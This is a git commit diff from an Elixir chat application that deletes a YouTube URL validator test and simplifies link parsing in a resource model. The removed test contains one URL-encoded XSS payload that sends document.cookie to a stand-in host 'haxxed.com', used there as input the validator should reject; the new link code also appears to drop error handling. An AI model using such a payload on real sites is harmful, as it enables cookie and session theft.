a05ff60512d9704908d0966279c8167f685f2679
DainisL <dainis186@gmail.com>
2016-08-25 12:29:26 +0300

    fixed DE647, DE686

--- test/lib/files/url_helpers_tes.exs
+++ test/lib/files/url_helpers_tes.exs
@@ -26,30 +26,5 @@ defmodule KlziiChat.Files.UrlHelpersTest do
       assert({:ok, "0zM3nApSvMg" } = UrlHelpers.youtube_id(youtube_links.g))
       assert({:ok, "0zM3nApSvMg" } = UrlHelpers.youtube_id(youtube_links.k))
     end
-
-    test "youtube_url_validator" do
-      valid_youtube_links = %{
-        a: "http://www.youtube.com/watch?v=0zM3nApSvMg&feature=feedrec_grec_index",
-        b: "http://www.youtube.com/user/IngridMichaelsonVEVO#p/a/u/1/QdK8U-VIH_o",
-        c: "http://www.youtube.com/v/0zM3nApSvMg?fs=1&amp;hl=en_US&amp;rel=0",
-        d: "http://www.youtube.com/watch?v=0zM3nApSvMg#t=0m10s",
-        f: "http://www.youtube.com/embed/0zM3nApSvMg?rel=0",
-        g: "http://www.youtube.com/watch?v=0zM3nApSvMg",
-        k: "http://youtu.be/0zM3nApSvMg"
-      }
-        invalid_youtube_links = %{
-          a: "http://www.welp.com/?search=%3Cscript%3Ewindow.location=%22http://www.haxxed.com?cookie=%22+document.cookie%3C/script%3E"
-        }
-
-        assert({:ok} = UrlHelpers.youtube_url_validator(valid_youtube_links.a))
-        assert({:ok} = UrlHelpers.youtube_url_validator(valid_youtube_links.b))
-        assert({:ok} = UrlHelpers.youtube_url_validator(valid_youtube_links.c))
-        assert({:ok} = UrlHelpers.youtube_url_validator(valid_youtube_links.d))
-        assert({:ok} = UrlHelpers.youtube_url_validator(valid_youtube_links.f))
-        assert({:ok} = UrlHelpers.youtube_url_validator(valid_youtube_links.g))
-        assert({:ok} = UrlHelpers.youtube_url_validator(valid_youtube_links.k))
-
-        assert({:error, _} = UrlHelpers.youtube_url_validator(invalid_youtube_links.a))
-    end
   end
 end
--- web/models/resource.ex
+++ web/models/resource.ex
@@ -48,12 +48,7 @@ defmodule KlziiChat.Resource do
   defp parse_link(base_changeset) do
     case base_changeset do
       %Ecto.Changeset{valid?: true, changes: %{link: link}} when is_bitstring(link) ->
-        case UrlHelpers.youtube_id(link) do
-          {:ok, link} ->
-            put_change(base_changeset, :link, link)
-          {:error, reason} ->
-            add_error(base_changeset, :link, reason)
-        end
+        put_change(base_changeset, :link, UrlHelpers.youtube_id(link))
       _ ->
         base_changeset
     end
